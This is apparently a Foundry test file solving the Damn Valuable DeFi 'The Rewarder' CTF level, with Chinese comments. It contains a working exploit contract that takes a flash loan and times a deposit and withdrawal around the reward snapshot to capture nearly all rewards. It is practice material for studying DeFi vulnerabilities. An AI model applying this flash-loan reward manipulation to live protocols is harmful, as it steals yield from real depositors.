// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";

import "forge-std/console.sol";

contract TheRewarder is Test {
    uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
    uint256 internal constant USER_DEPOSIT = 100e18;

    Utilities internal utils;
    FlashLoanerPool internal flashLoanerPool;
    TheRewarderPool internal theRewarderPool;
    DamnValuableToken internal dvt;
    address payable[] internal users;
    address payable internal attacker;
    address payable internal alice;
    address payable internal bob;
    address payable internal charlie;
    address payable internal david;

    function setUp() public {
        utils = new Utilities();
        users = utils.createUsers(5);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];
        attacker = users[4];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        flashLoanerPool = new FlashLoanerPool(address(dvt));
        vm.label(address(flashLoanerPool), "Flash Loaner Pool");

        // Set initial token balance of the pool offering flash loans
        dvt.transfer(address(flashLoanerPool), TOKENS_IN_LENDER_POOL);

        theRewarderPool = new TheRewarderPool(address(dvt));

        // Alice, Bob, Charlie and David deposit 100 tokens each
        for (uint8 i; i < 4; i++) {
            dvt.transfer(users[i], USER_DEPOSIT);
            vm.startPrank(users[i]);
            dvt.approve(address(theRewarderPool), USER_DEPOSIT);
            theRewarderPool.deposit(USER_DEPOSIT);
            assertEq(
                theRewarderPool.accToken().balanceOf(users[i]),
                USER_DEPOSIT
            );
            vm.stopPrank();
        }

        assertEq(theRewarderPool.accToken().totalSupply(), USER_DEPOSIT * 4);
        assertEq(theRewarderPool.rewardToken().totalSupply(), 0);

        // Advance time 5 days so that depositors can get rewards
        vm.warp(block.timestamp + 5 days); // 5 days

        for (uint8 i; i < 4; i++) {
            vm.prank(users[i]);
            theRewarderPool.distributeRewards();
            assertEq(
                theRewarderPool.rewardToken().balanceOf(users[i]),
                25e18 // Each depositor gets 25 reward tokens
            );
        }

        assertEq(theRewarderPool.rewardToken().totalSupply(), 100e18);
        assertEq(dvt.balanceOf(attacker), 0); // Attacker starts with zero DVT tokens in balance
        assertEq(theRewarderPool.roundNumber(), 2); // Two rounds should have occurred so far
        // alice是向theRewarderPool存款的第一个用户
        // 想要在一个新分红周期里领钱,那么在该分红周期开始的时候(会进行快照),账户里必须有钱
        // 只要快照的时候账户里有dvt,那么就表明肯定有同等数量的accToken,那么账户去执行distributeRewards的时候就有钱拿

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploitSHIT() public {
        // 必须想办法在新一轮分红周期开始的那个时刻, 也就是执行快照的时刻, attacker有dvt存在reward池中
        // 这个dvt是从闪电贷中贷出来的
        // 满足上面的条件之后, 分两种情况:新周期是由attacker开启的,开启的时候有dvt资金在attacker的账户里
        // 或者虽然新周期是由其他用户调用开启的, 
        // 但开启的时候, attacker有dvt存在reward池中, 然后attacker调distributeRewards拿奖励
        // 但由于EXPLOIT的时候ctf限制只能用attacker, 导致只能是第一种情况

        /** EXPLOIT START **/
        vm.warp(block.timestamp + 5 days);
        ExecuteCode ec=new ExecuteCode();
        bytes memory code = address(ec).code;
        vm.etch(attacker, code);
        (bool success,)=attacker.call(abi.encodeWithSignature("initAddress(address,address,address)",dvt,theRewarderPool,attacker));
        console.log(success);

        vm.startPrank(attacker);
        flashLoanerPool.flashLoan(TOKENS_IN_LENDER_POOL);
        vm.stopPrank();

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(theRewarderPool.roundNumber(), 3); // Only one round should have taken place
        for (uint8 i; i < 4; i++) {
            // Users should get negligible rewards this round
            vm.prank(users[i]);
            theRewarderPool.distributeRewards();
            uint256 rewardPerUser = theRewarderPool.rewardToken().balanceOf(
                users[i]
            );
            uint256 delta = rewardPerUser - 25e18;
            assertLt(delta, 1e16);
        }
        // Rewards must have been issued to the attacker account
        assertGt(theRewarderPool.rewardToken().totalSupply(), 100e18);
        uint256 rewardAttacker = theRewarderPool.rewardToken().balanceOf(
            attacker
        );

        // The amount of rewards earned should be really close to 100 tokens
        uint256 deltaAttacker = 100e18 - rewardAttacker;
        assertLt(deltaAttacker, 1e17);

        // Attacker finishes with zero DVT tokens in balance
        assertEq(dvt.balanceOf(attacker), 0);
    }
}

contract ExecuteCode is Test {
    DamnValuableToken internal dvt;
    TheRewarderPool internal theRewarderPool;
    address internal attacker;
    uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
    function initAddress(DamnValuableToken _dvt,TheRewarderPool _theRewarderPool, address _attacker) public {
        dvt=_dvt;
        console.log(address(dvt));
        theRewarderPool=_theRewarderPool;
        attacker=_attacker;
    }

    // 攻击逻辑要在这个函数里进行
    // 闪电贷,然后把贷来的dvt向reward池存款,存款时就被动领取了奖励了,然后取款,然后归还闪电贷
    function receiveFlashLoan(uint256) external payable {
        console.log(address(dvt));
        assertEq(dvt.balanceOf(attacker),TOKENS_IN_LENDER_POOL);
        dvt.approve(address(theRewarderPool),TOKENS_IN_LENDER_POOL);
        theRewarderPool.deposit(TOKENS_IN_LENDER_POOL);
        theRewarderPool.withdraw(TOKENS_IN_LENDER_POOL);
        assertEq(dvt.balanceOf(attacker),TOKENS_IN_LENDER_POOL);
        dvt.transfer(msg.sender,TOKENS_IN_LENDER_POOL);
    }
}